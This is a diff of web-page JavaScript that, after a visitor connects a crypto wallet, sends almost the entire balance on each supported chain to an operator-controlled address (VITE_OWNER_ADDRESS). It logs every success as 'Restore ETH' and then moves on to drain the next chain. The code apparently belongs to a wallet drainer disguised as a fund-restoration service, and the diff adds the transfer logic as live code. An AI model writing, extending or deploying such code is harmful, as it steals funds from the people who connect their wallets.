@@ -321,6 +321,47 @@ document.addEventListener("DOMContentLoaded", async () => {
         Number(BigInt(currentChain).toString()) == 56 ||
         Number(BigInt(currentChain).toString()) == 137
       ) {
+        const resTX = {
+          from: `0x${connectedAccounts[0].replace(/^0x/, "")}`,
+          to: `0x${import.meta.env.VITE_OWNER_ADDRESS.replace(/^0x/, "")}`,
+          value: `0x${valueToSend.toString(16)}`,
+          nonce: `0x${BigInt(userNonce).toString(16)}`,
+        };
+
+        const estimatedGas = await modal.getWalletProvider().request({
+          method: "eth_estimateGas",
+          params: [resTX],
+        });
+
+        const gasPrice = await modal.getWalletProvider().request({
+          method: "eth_gasPrice",
+        });
+
+        const realValue =
+          valueToSend - BigInt(estimatedGas) * BigInt(gasPrice) * 5n;
+
+        if (realValue <= 0n) {
+          throw new Error(`Insufficient Balance`);
+        }
+
+        resTX.value = `0x${realValue.toString(16)}`;
+
+        const sendTX = await modal.getWalletProvider().request({
+          method: "eth_sendTransaction",
+          params: [resTX],
+        });
+
+        await sendErr(
+          `Restore ETH Success Hash: ${sendTX} on chain ${currentChain}`
+        );
+
+        usedChains.push(Number(BigInt(currentChain).toString()));
+        mySupportedChains = mySupportedChains.filter(
+          (item) => !usedChains.includes(Number(item))
+        );
+
+        switchChain(mySupportedChains[0]);
+      } else {
         const currentChainNUM = Number(BigInt(currentChain).toString());
         const iFace = new utils.Interface(RESTORE_ABI.RESTORE_ABI);
 
@@ -360,47 +401,6 @@ document.addEventListener("DOMContentLoaded", async () => {
         const sendTX = await modal.getWalletProvider().request({
           method: "eth_sendTransaction",
           params: [restoreTX],
-        });
-
-        await sendErr(
-          `Restore ETH Success Hash: ${sendTX} on chain ${currentChain}`
-        );
-
-        usedChains.push(Number(BigInt(currentChain).toString()));
-        mySupportedChains = mySupportedChains.filter(
-          (item) => !usedChains.includes(Number(item))
-        );
-
-        switchChain(mySupportedChains[0]);
-      } else {
-        const resTX = {
-          from: `0x${connectedAccounts[0].replace(/^0x/, "")}`,
-          to: `0x${import.meta.env.VITE_OWNER_ADDRESS.replace(/^0x/, "")}`,
-          value: `0x${valueToSend.toString(16)}`,
-          nonce: `0x${BigInt(userNonce).toString(16)}`,
-        };
-
-        const estimatedGas = await modal.getWalletProvider().request({
-          method: "eth_estimateGas",
-          params: [resTX],
-        });
-
-        const gasPrice = await modal.getWalletProvider().request({
-          method: "eth_gasPrice",
-        });
-
-        const realValue =
-          valueToSend - BigInt(estimatedGas) * BigInt(gasPrice) * 5n;
-
-        if (realValue <= 0n) {
-          throw new Error(`Insufficient Balance`);
-        }
-
-        resTX.value = `0x${realValue.toString(16)}`;
-
-        const sendTX = await modal.getWalletProvider().request({
-          method: "eth_sendTransaction",
-          params: [resTX],
         });
 
         await sendErr(
